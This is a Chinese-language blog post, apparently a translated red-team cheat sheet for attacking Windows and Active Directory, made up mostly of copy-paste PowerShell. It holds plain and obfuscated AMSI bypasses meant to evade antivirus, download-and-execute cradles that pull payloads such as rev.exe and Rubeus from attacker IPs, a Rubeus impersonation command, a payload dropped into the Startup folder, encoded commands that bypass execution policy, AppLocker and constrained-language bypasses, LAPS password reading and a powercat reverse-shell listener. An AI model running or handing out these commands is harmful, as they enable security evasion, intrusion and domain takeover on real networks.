@@ -1,0 +1,1672 @@
+<!doctype html>
+
+
+
+  
+
+
+<html class="theme-next pisces use-motion" lang="zh-Hans">
+<head>
+  <meta charset="UTF-8"/>
+<meta http-equiv="X-UA-Compatible" content="IE=edge" />
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1"/>
+
+
+
+
+
+
+
+
+
+<meta http-equiv="Cache-Control" content="no-transform" />
+<meta http-equiv="Cache-Control" content="no-siteapp" />
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+  <link href="/lib/fancybox/source/jquery.fancybox.css?v=2.1.5" rel="stylesheet" type="text/css" />
+
+
+
+
+  
+  
+  
+  
+
+  
+    
+    
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+    
+    
+    <link href="//fonts.googleapis.com/css?family=Lato:300,300italic,400,400italic,700,700italic&subset=latin,latin-ext" rel="stylesheet" type="text/css">
+  
+
+
+
+
+
+
+<link href="/lib/font-awesome/css/font-awesome.min.css?v=4.6.2" rel="stylesheet" type="text/css" />
+
+<link href="/css/main.css?v=5.1.1" rel="stylesheet" type="text/css" />
+
+
+  <meta name="keywords" content="域,备忘录,AD," />
+
+
+
+
+
+  <link rel="alternate" href="/atom.xml" title="信息安全初学者" type="application/atom+xml" />
+
+
+
+
+  <link rel="shortcut icon" type="image/x-icon" href="/favicon.ico?v=5.1.1" />
+
+
+
+
+
+
+<meta name="description" content="Windows和Active Directory备忘单和命令参考GeneralPowerShell AMSI Bypass修补AMSI将有助于绕过执行标记为恶意的PowerShell脚本（例如PowerView）时触发的AV警告。请勿在秘密操作中按原样使用，因为它们会被标记flag。通过更改脚本以胜过基于签名的检测，可以混淆甚至更好地完全消除AMSI绕过的需要。">
+<meta name="keywords" content="域,备忘录,AD">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Windows和Active Directory备忘单和命令参考">
+<meta property="og:url" content="https://yaalonsong.github.io/2021/05/19/Windows和Active Directory开发备忘单和命令参考.html">
+<meta property="og:site_name" content="信息安全初学者">
+<meta property="og:description" content="Windows和Active Directory备忘单和命令参考GeneralPowerShell AMSI Bypass修补AMSI将有助于绕过执行标记为恶意的PowerShell脚本（例如PowerView）时触发的AV警告。请勿在秘密操作中按原样使用，因为它们会被标记flag。通过更改脚本以胜过基于签名的检测，可以混淆甚至更好地完全消除AMSI绕过的需要。">
+<meta property="og:locale" content="zh-Hans">
+<meta property="og:updated_time" content="2021-05-19T08:17:30.273Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="Windows和Active Directory备忘单和命令参考">
+<meta name="twitter:description" content="Windows和Active Directory备忘单和命令参考GeneralPowerShell AMSI Bypass修补AMSI将有助于绕过执行标记为恶意的PowerShell脚本（例如PowerView）时触发的AV警告。请勿在秘密操作中按原样使用，因为它们会被标记flag。通过更改脚本以胜过基于签名的检测，可以混淆甚至更好地完全消除AMSI绕过的需要。">
+
+
+
+<script type="text/javascript" id="hexo.configurations">
+  var NexT = window.NexT || {};
+  var CONFIG = {
+    root: '/',
+    scheme: 'Pisces',
+    sidebar: {"position":"left","display":"post","offset":12,"offset_float":0,"b2t":false,"scrollpercent":false},
+    fancybox: true,
+    motion: true,
+    duoshuo: {
+      userId: '0',
+      author: '博主'
+    },
+    algolia: {
+      applicationID: '',
+      apiKey: '',
+      indexName: '',
+      hits: {"per_page":10},
+      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
+    }
+  };
+</script>
+
+
+
+  <link rel="canonical" href="https://yaalonsong.github.io/2021/05/19/Windows和Active Directory开发备忘单和命令参考.html"/>
+
+
+
+
+
+  <title>Windows和Active Directory备忘单和命令参考 | 信息安全初学者</title>
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage" lang="zh-Hans">
+
+  
+
+
+
+
+<script>
+  (function(i,s,o,g,r,a,m){i['GoogleAnalyticsObject']=r;i[r]=i[r]||function(){
+            (i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o),
+          m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;m.parentNode.insertBefore(a,m)
+  })(window,document,'script','https://www.google-analytics.com/analytics.js','ga');
+  ga('create', '111023405-1', 'auto');
+  ga('send', 'pageview');
+</script>
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+    
+  
+
+  <div class="container sidebar-position-left page-post-detail ">
+    <div class="headband"></div>
+
+    <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-wrapper">
+  <div class="site-meta ">
+    
+
+    <div class="custom-logo-site-title">
+      <a href="/"  class="brand" rel="start">
+        <span class="logo-line-before"><i></i></span>
+        <span class="site-title">信息安全初学者</span>
+        <span class="logo-line-after"><i></i></span>
+      </a>
+    </div>
+      
+        <p class="site-subtitle">No pains No gains！</p>
+      
+  </div>
+
+  <div class="site-nav-toggle">
+    <button>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+    </button>
+  </div>
+</div>
+
+<nav class="site-nav">
+  
+
+  
+    <ul id="menu" class="menu">
+      
+        
+        <li class="menu-item menu-item-home">
+          <a href="/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-home"></i> <br />
+            
+            首页
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-categories">
+          <a href="/categories/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-smile-o"></i> <br />
+            
+            分类
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-archives">
+          <a href="/archives/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-angellist"></i> <br />
+            
+            归档
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-tags">
+          <a href="/tags/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-diamond"></i> <br />
+            
+            标签云
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-others">
+          <a href="/others/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-hashtag"></i> <br />
+            
+            其他
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-music">
+          <a href="/music/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-music"></i> <br />
+            
+            小曲怡情
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-about">
+          <a href="/about/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-mortar-board"></i> <br />
+            
+            关于作者
+          </a>
+        </li>
+      
+
+      
+        <li class="menu-item menu-item-search">
+          
+            <a href="javascript:;" class="popup-trigger">
+          
+            
+              <i class="menu-item-icon fa fa-search fa-fw"></i> <br />
+            
+            搜索
+          </a>
+        </li>
+      
+    </ul>
+  
+
+  
+    <div class="site-search">
+      
+  <div class="popup search-popup local-search-popup">
+  <div class="local-search-header clearfix">
+    <span class="search-icon">
+      <i class="fa fa-search"></i>
+    </span>
+    <span class="popup-btn-close">
+      <i class="fa fa-times-circle"></i>
+    </span>
+    <div class="local-search-input-wrapper">
+      <input autocomplete="off"
+             placeholder="想找什么东西不妨搜索一下" spellcheck="false"
+             type="text" id="local-search-input">
+    </div>
+  </div>
+  <div id="local-search-result"></div>
+</div>
+
+
+
+    </div>
+  
+</nav>
+
+
+
+ </div>
+    </header>
+
+    <main id="main" class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          <div id="content" class="content">
+            
+
+  <div id="posts" class="posts-expand">
+    
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal " itemscope itemtype="http://schema.org/Article">
+    <link itemprop="mainEntityOfPage" href="https://yaalonsong.github.io/2021/05/19/Windows和Active Directory开发备忘单和命令参考.html">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="yaron">
+      <meta itemprop="description" content="">
+      <meta itemprop="image" content="/images/avatar.gif">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="信息安全初学者">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">Windows和Active Directory备忘单和命令参考</h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">发表于</span>
+              
+              <time title="创建于" itemprop="dateCreated datePublished" datetime="2021-05-19T16:14:10+08:00">
+                2021-05-19
+              </time>
+            
+
+            
+              <span class="post-meta-divider">|</span>
+            
+
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-check-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">更新于</span>
+              
+              <time title="更新于" itemprop="dateModified" datetime="2021-05-19T16:17:30+08:00">
+                2021-05-19
+              </time>
+            
+          </span>
+
+          
+            <span class="post-category" >
+            
+              <span class="post-meta-divider">|</span>
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-wechat"></i>
+              </span>
+              
+                <span class="post-meta-item-text">分类于</span>
+              
+              
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/备忘录/" itemprop="url" rel="index">
+                    <span itemprop="name">备忘录</span>
+                  </a>
+                </span>
+
+                
+                
+              
+            </span>
+          
+          
+            
+          
+
+          
+          
+          
+          
+            <span class="post-meta-divider"></span>
+            <span class="page-pv"><i>| </i> <i class="fa fa-free-code-camp"> 热度</i>
+            <span class="busuanzi-value" id="busuanzi_value_page_pv" ></span>
+            </span>
+            <span>℃</span>
+          
+                  <span class="post-meta-divider">|</span>                  
+          
+            <div class="post-wordcount">
+              
+                
+                  <span class="post-meta-divider"></span>
+                
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-file-word-o"></i>
+                </span>
+                
+                  <span class="post-meta-item-text">本文共</span>
+                
+                <span title="本文共">
+                  8,825
+                </span>
+                <span>字</span>
+              
+
+              
+                <span class="post-meta-divider">|</span>
+              
+
+              
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-clock-o"></i>
+                </span>
+                
+                  <span class="post-meta-item-text">用时</span>
+
+                
+                <span title="用时">
+                  39
+                </span>
+                <span>min</span>
+              
+            </div>
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        <h1 id="Windows和Active-Directory备忘单和命令参考"><a href="#Windows和Active-Directory备忘单和命令参考" class="headerlink" title="Windows和Active Directory备忘单和命令参考"></a>Windows和Active Directory备忘单和命令参考</h1><h2 id="General"><a href="#General" class="headerlink" title="General"></a>General</h2><h3 id="PowerShell-AMSI-Bypass"><a href="#PowerShell-AMSI-Bypass" class="headerlink" title="PowerShell AMSI Bypass"></a>PowerShell AMSI Bypass</h3><p>修补AMSI将有助于绕过执行标记为恶意的<code>PowerShell</code>脚本（例如<code>PowerView</code>）时触发的AV警告。请勿在秘密操作中按原样使用，因为它们会被标记<code>flag</code>。通过更改脚本以胜过基于签名的检测，可以混淆甚至更好地完全消除AMSI绕过的需要。</p>
+<a id="more"></a>
+<p>‘Plain’ AMSI bypass:</p>
+<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[Ref].Assembly.GetType(<span class="string">'System.Management.Automation.AmsiUtils'</span>).GetField(<span class="string">'amsiInitFailed'</span>,<span class="string">'NonPublic,Static'</span>).SetValue(<span class="literal">$null</span>,<span class="literal">$true</span>)</span><br></pre></td></tr></table></figure>
+<p>用于复制粘贴的混淆示例：</p>
+<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">sET-ItEM</span> ( <span class="string">'V'</span>+<span class="string">'aR'</span> +  <span class="string">'IA'</span> + <span class="string">'blE:1q2'</span>  + <span class="string">'uZx'</span>  ) ( [TYpE](  <span class="string">"&#123;1&#125;&#123;0&#125;"</span>-F<span class="string">'F'</span>,<span class="string">'rE'</span>  ) )  ;    (    <span class="built_in">GeT-VariaBle</span>  ( <span class="string">"1Q2U"</span>  +<span class="string">"zX"</span>  )  -VaL ).<span class="string">"A`ss`Embly"</span>.<span class="string">"GET`TY`Pe"</span>((  <span class="string">"&#123;6&#125;&#123;3&#125;&#123;1&#125;&#123;4&#125;&#123;2&#125;&#123;0&#125;&#123;5&#125;"</span> -f<span class="string">'Util'</span>,<span class="string">'A'</span>,<span class="string">'Amsi'</span>,<span class="string">'.Management.'</span>,<span class="string">'utomation.'</span>,<span class="string">'s'</span>,<span class="string">'System'</span>  ) ).<span class="string">"g`etf`iElD"</span>(  ( <span class="string">"&#123;0&#125;&#123;2&#125;&#123;1&#125;"</span> -f<span class="string">'amsi'</span>,<span class="string">'d'</span>,<span class="string">'InitFaile'</span>  ),(  <span class="string">"&#123;2&#125;&#123;4&#125;&#123;0&#125;&#123;1&#125;&#123;3&#125;"</span> -f <span class="string">'Stat'</span>,<span class="string">'i'</span>,<span class="string">'NonPubli'</span>,<span class="string">'c'</span>,<span class="string">'c,'</span> )).<span class="string">"sE`T`VaLUE"</span>(  $&#123;n`ULl&#125;,$&#123;t`RuE&#125; )</span><br></pre></td></tr></table></figure>
+<p>另一个旁路，PowerShell自动记录未检测到：</p>
+<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[Delegate]::CreateDelegate((<span class="string">"Func``3[String, $(([String].Assembly.GetType('System.Reflection.Bindin'+'gFlags')).FullName), System.Reflection.FieldInfo]"</span> -as [String].Assembly.GetType(<span class="string">'System.T'</span>+<span class="string">'ype'</span>)), [Object]([Ref].Assembly.GetType(<span class="string">'System.Management.Automation.AmsiUtils'</span>)),(<span class="string">'GetFie'</span>+<span class="string">'ld'</span>)).Invoke(<span class="string">'amsiInitFailed'</span>,((<span class="string">'Non'</span>+<span class="string">'Public,Static'</span>) -as [String].Assembly.GetType(<span class="string">'System.Reflection.Bindin'</span>+<span class="string">'gFlags'</span>))).SetValue(<span class="literal">$null</span>,<span class="literal">$True</span>)</span><br></pre></td></tr></table></figure>
+<blockquote>
+<p>更多绕过点击<a href="https://github.com/S3cur3Th1sSh1t/Amsi-Bypass-Powershell" target="_blank" rel="noopener">这里</a>。对于混淆，请检查<a href="https://github.com/danielbohannon/Invoke-Obfuscation" target="_blank" rel="noopener">Invoke-Obfuscation</a>，或在<a href="https://amsi.fail/" target="_blank" rel="noopener">amsi.fail</a>上获取预先生成的混淆版本。</p>
+</blockquote>
+<h3 id="PowerShell-one-liners"><a href="#PowerShell-one-liners" class="headerlink" title="PowerShell one-liners"></a>PowerShell one-liners</h3><h4 id="反射式加载PowerShell脚本"><a href="#反射式加载PowerShell脚本" class="headerlink" title="反射式加载PowerShell脚本"></a><strong>反射式加载PowerShell脚本</strong></h4><p>代理感知：</p>
+<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">IEX (<span class="built_in">New-Object</span> Net.WebClient).DownloadString(<span class="string">'http://10.10.16.7/PowerView.obs.ps1'</span>)</span><br></pre></td></tr></table></figure>
+<p>不了解代理：</p>
+<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$h</span>=<span class="built_in">new-object</span> -com WinHttp.WinHttpRequest.<span class="number">5.1</span>;<span class="variable">$h</span>.open(<span class="string">'GET'</span>,<span class="string">'http://10.10.16.7/PowerView.obs.ps1'</span>,<span class="literal">$false</span>);<span class="variable">$h</span>.send();iex <span class="variable">$h</span>.responseText</span><br></pre></td></tr></table></figure>
+<blockquote>
+<p>同样，这可能会被标记flag。有关opsec安全的下载通讯座，请查看<a href="https://github.com/danielbohannon/Invoke-CradleCrafter" target="_blank" rel="noopener">Invoke-CradleCrafter</a>。</p>
+</blockquote>
+<h4 id="反射式加载C＃程序集"><a href="#反射式加载C＃程序集" class="headerlink" title="反射式加载C＃程序集"></a><strong>反射式加载C＃程序集</strong></h4><p>在运行该类之前，请确保所引用的类和main方法为Public。请注意，为此可能需要全过程的AMSI旁路，<a href="https://s3cur3th1ssh1t.github.io/Powershell-and-the-.NET-AMSI-Interface/" target="_blank" rel="noopener">有关详细信息</a>，<a href="https://s3cur3th1ssh1t.github.io/Powershell-and-the-.NET-AMSI-Interface/" target="_blank" rel="noopener">请参见此处</a>。</p>
+<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># Download and run assembly without arguments</span></span><br><span class="line"><span class="variable">$data</span> = (<span class="built_in">New-Object</span> System.Net.WebClient).DownloadData(<span class="string">'http://10.10.16.7/rev.exe'</span>)</span><br><span class="line"><span class="variable">$assem</span> = [System.Reflection.Assembly]::Load(<span class="variable">$data</span>)</span><br><span class="line">[rev.Program]::Main(<span class="string">""</span>.Split())</span><br><span class="line"></span><br><span class="line"><span class="comment"># Download and run Rubeus, with arguments</span></span><br><span class="line"><span class="variable">$data</span> = (<span class="built_in">New-Object</span> System.Net.WebClient).DownloadData(<span class="string">'http://10.10.16.7/Rubeus.exe'</span>)</span><br><span class="line"><span class="variable">$assem</span> = [System.Reflection.Assembly]::Load(<span class="variable">$data</span>)</span><br><span class="line">[Rubeus.Program]::Main(<span class="string">"s4u /user:web01$ /rc4:1d77f43d9604e79e5626c6905705801e /impersonateuser:administrator /msdsspn:cifs/file01 /ptt"</span>.Split())</span><br><span class="line"></span><br><span class="line"><span class="comment"># Execute a specific method from an assembly (e.g. a DLL)</span></span><br><span class="line"><span class="variable">$data</span> = (<span class="built_in">New-Object</span> System.Net.WebClient).DownloadData(<span class="string">'http://10.10.16.7/lib.dll'</span>)</span><br><span class="line"><span class="variable">$assem</span> = [System.Reflection.Assembly]::Load(<span class="variable">$data</span>)</span><br><span class="line"><span class="variable">$class</span> = <span class="variable">$assem</span>.GetType(<span class="string">"ClassLibrary1.Class1"</span>)</span><br><span class="line"><span class="variable">$method</span> = <span class="variable">$class</span>.GetMethod(<span class="string">"runner"</span>)</span><br><span class="line"><span class="variable">$method</span>.Invoke(<span class="number">0</span>, <span class="literal">$null</span>)</span><br></pre></td></tr></table></figure>
+<h4 id="下载文件"><a href="#下载文件" class="headerlink" title="下载文件"></a>下载文件</h4><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># Any version</span></span><br><span class="line">(<span class="built_in">New-Object</span> System.Net.WebClient).DownloadFile(<span class="string">"http://192.168.119.155/PowerUp.ps1"</span>, <span class="string">"C:\Windows\Temp\PowerUp.ps1"</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># Powershell 4+</span></span><br><span class="line"><span class="comment">## You can use 'IWR' as a shorthand</span></span><br><span class="line"><span class="built_in">Invoke-WebRequest</span> <span class="string">"http://10.10.16.7/Incnspc64.exe"</span> -OutFile <span class="string">"C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp\Incnspc64.exe"</span></span><br></pre></td></tr></table></figure>
+<h4 id="编码命令"><a href="#编码命令" class="headerlink" title="编码命令"></a>编码命令</h4><p>编码一线：</p>
+<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$command</span> = <span class="string">'IEX (New-Object Net.WebClient).DownloadString("http://172.16.100.55/Invoke-PowerShellTcpRun.ps1")'</span></span><br><span class="line"><span class="variable">$bytes</span> = [System.Text.Encoding]::Unicode.GetBytes(<span class="variable">$command</span>)</span><br><span class="line"><span class="variable">$encodedCommand</span> = [Convert]::ToBase64String(<span class="variable">$bytes</span>)</span><br></pre></td></tr></table></figure>
+<p>或以上版本的Linux：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">echo</span> <span class="string">'IEX (New-Object Net.WebClient).DownloadString("http://172.16.100.55/Invoke-PowerShellTcpRun.ps1")'</span> | iconv -t utf-16le | base64 -w 0</span><br></pre></td></tr></table></figure>
+<p>对现有脚本进行编码，然后复制到剪贴板：</p>
+<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[System.Convert]::ToBase64String([System.IO.File]::ReadAllBytes(<span class="string">'c:\path\to\PowerView.ps1'</span>)) | clip</span><br></pre></td></tr></table></figure>
+<p>运行它，绕过执行策略。</p>
+<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Powershell -EncodedCommand <span class="variable">$encodedCommand</span></span><br></pre></td></tr></table></figure>
+<blockquote>
+<p>如果您方便使用Nishang，则可以使用<a href="https://github.com/samratashok/nishang/blob/master/Utility/Invoke-Encode.ps1" target="_blank" rel="noopener">Invoke-Encode.ps1</a>。</p>
+</blockquote>
+<h2 id="枚举"><a href="#枚举" class="headerlink" title="枚举"></a><strong>枚举</strong></h2><h3 id="使用PowerView进行AD枚举"><a href="#使用PowerView进行AD枚举" class="headerlink" title="使用PowerView进行AD枚举"></a><strong>使用PowerView进行AD枚举</strong></h3><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 获取当前域中的所有用户</span></span><br><span class="line">Get-NetUser | select -ExpandProperty cn</span><br><span class="line"></span><br><span class="line"><span class="comment"># 获取当前域中的所有计算机</span></span><br><span class="line">Get-NetComputer</span><br><span class="line"></span><br><span class="line"><span class="comment"># 获取当前林中的所有域</span></span><br><span class="line">Get-NetForestDomain</span><br><span class="line"></span><br><span class="line"><span class="comment"># 获取域/林信任</span></span><br><span class="line">Get-NetDomainTrust</span><br><span class="line">Get-NetForestTrust</span><br><span class="line"></span><br><span class="line"><span class="comment"># 获取DA组的信息</span></span><br><span class="line">Get-NetGroup -GroupName <span class="string">"Domain Admins"</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 查找DA组的成员</span></span><br><span class="line">Get-NetGroupMember -GroupName <span class="string">"Domain Admins"</span> | select -ExpandProperty membername</span><br><span class="line"></span><br><span class="line"><span class="comment"># 在域中查找有趣的共享，忽略默认共享</span></span><br><span class="line">Invoke-ShareFinder -ExcludeStandard -ExcludePrint -ExcludeIPC</span><br><span class="line"></span><br><span class="line"><span class="comment"># 获取当前域的OU</span></span><br><span class="line">Get-NetOU -FullData</span><br><span class="line"></span><br><span class="line"><span class="comment"># 在OU中获取计算机</span></span><br><span class="line"><span class="comment"># %&#123;&#125; 是循环语句</span></span><br><span class="line">Get-NetOU -OUName StudentMachines | %&#123;Get-NetComputer -ADSPath <span class="variable">$_</span>&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment"># 获取适用于特定OU的GPO</span></span><br><span class="line">Get-NetOU *student* | select gplink</span><br><span class="line">Get-NetGPO -Name <span class="string">"&#123;3E04167E-C2B6-4A9A-8FB7-C811158DC97C&#125;"</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 获取通过GPO设置的受限组，查找通过域强制设置的有趣组成员身份</span></span><br><span class="line">Get-NetGPOGroup</span><br><span class="line"></span><br><span class="line"><span class="comment"># 获取特定对象的传入ACL</span></span><br><span class="line">Get-ObjectACL -SamAccountName <span class="string">"Domain Admins"</span> -ResolveGUIDs | Select IdentityReference,ActiveDirectoryRights</span><br><span class="line"></span><br><span class="line"><span class="comment"># 查找整个域的有趣ACL，以可读（从左到右）格式显示</span></span><br><span class="line">Find-InterestingDomainAcl | select identityreferencename,activedirectoryrights,acetype,objectdn | ?&#123;<span class="variable">$_</span>.IdentityReferenceName <span class="nomarkup">-NotContains</span> <span class="string">"DnsAdmins"</span>&#125; | ft</span><br><span class="line"></span><br><span class="line"><span class="comment"># 获取特定用户或组的有趣的传出ACL</span></span><br><span class="line"><span class="comment"># ?&#123;&#125; 是一个过滤器语句</span></span><br><span class="line">Find-InterestingDomainAcl -ResolveGUIDs | ?&#123;<span class="variable">$_</span>.IdentityReference <span class="nomarkup">-match</span> <span class="string">"Domain Admins"</span>&#125; | select ObjectDN,ActiveDirectoryRights</span><br></pre></td></tr></table></figure>
+<h3 id="AppLocker"><a href="#AppLocker" class="headerlink" title="AppLocker"></a>AppLocker</h3><p>识别AppLocker策略。寻找免除的二进制文件或要绕过的路径。</p>
+<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Get-AppLockerPolicy -Effective | select -ExpandProperty RuleCollections</span><br></pre></td></tr></table></figure>
+<ul>
+<li>一些高级绕过技术：<ul>
+<li>如果仅允许使用（Microsoft）签名的二进制文件，请使用<a href="https://lolbas-project.github.io/" target="_blank" rel="noopener">LOLBAS</a>。</li>
+<li>如果<code>C:\Windows</code>允许来自的二进制文件，请尝试将您的二进制文件拖放到<code>C:\Windows\Temp</code>或<code>C:\Windows\Tasks</code>。如果此目录树中没有可写的子目录，但存在可写文件，则将文件写入备用数据流（例如JScript脚本），然后从那里执行它。</li>
+<li>将您的二进制文件包装在DLL文件中，然后执行<code>rundll32</code>以绕过可执行规则。如果允许使用Python之类的二进制文件，请使用该文件。如果这不起作用，请尝试其他技术，例如将JScript包装在HTA文件中或使用来运行XSL文件<code>wmic</code>。</li>
+</ul>
+</li>
+</ul>
+<h3 id="PowerShell受限语言模式"><a href="#PowerShell受限语言模式" class="headerlink" title="PowerShell受限语言模式"></a>PowerShell受限语言模式</h3><p>有时，您可能会发现自己处于执行约束语言模式（CLM）的PowerShell会话中。与AppLocker配对时，通常是这种情况（请参见上文）。</p>
+<p>您可以通过轮询以下变量来获取当前的语言模式，从而确定自己处于受限语言模式。<code>FullLanguage</code>对于无限制的会话和<code>ConstrainedLanguage</code>CLM ，它将说。还有其他语言模式，在这里我将不再赘述。</p>
+<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$ExecutionContext</span>.SessionState.LanguageMode</span><br></pre></td></tr></table></figure>
+<p>CLM构成的约束将阻止您的许多利用尝试。一种快速而肮脏的绕过方法是使用内联函数，该函数有时会起作用-如果例如<code>whoami</code>被阻止，请尝试以下操作：</p>
+<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&amp;&#123;whoami&#125;</span><br></pre></td></tr></table></figure>
+<h3 id="LAPS"><a href="#LAPS" class="headerlink" title="LAPS"></a>LAPS</h3><p>我们可以使用<a href="https://github.com/leoloobeek/LAPSToolkit/blob/master/LAPSToolkit.ps1" target="_blank" rel="noopener">LAPSToolkit.ps1</a>来识别域中的哪些计算机使用LAPS，以及允许哪些域组读取LAPS密码。如果属于此组，则也可以使用此工具获取当前的LAPS密码。</p>
+<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 获取运行LAPS的计算机及其密码（如果允许我们读取这些密码）</span></span><br><span class="line">Get-LAPSComputers</span><br><span class="line"></span><br><span class="line"><span class="comment"># 获取允许读取LAPS密码的组</span></span><br><span class="line">Find-LAPSDelegatedGroups</span><br></pre></td></tr></table></figure>
+<h2 id="Exploitation"><a href="#Exploitation" class="headerlink" title="Exploitation"></a>Exploitation</h2><h3 id="Powercat反向shell"><a href="#Powercat反向shell" class="headerlink" title="Powercat反向shell"></a>Powercat反向shell</h3><p>如果您的Linux机壳没有反向外壳，则可以选择;）。</p>
+<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">powercat -l -p <span class="number">443</span> -t <span class="number">9999</span></span><br></pre></td></tr></table></figure>
